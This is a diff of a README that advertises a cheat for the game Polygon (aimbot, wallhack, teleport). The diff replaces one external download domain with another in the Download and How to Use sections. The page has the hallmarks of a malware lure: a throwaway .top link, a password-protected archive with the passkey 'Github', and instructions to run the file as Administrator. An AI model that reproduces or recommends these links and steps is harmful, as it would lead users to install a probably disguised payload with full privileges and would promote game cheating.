@@ -6,7 +6,7 @@ Polygon external hack with ESP wallhack, aimbot, see through walls, teleport, we
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top/)**
 
 Archive passkey: `Github`
 
@@ -76,7 +76,7 @@ Archive passkey: `Github`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top/)** to download.
 2. Extract the archive.
 3. Launch Polygon.
 4. Run the hack **as Administrator**.
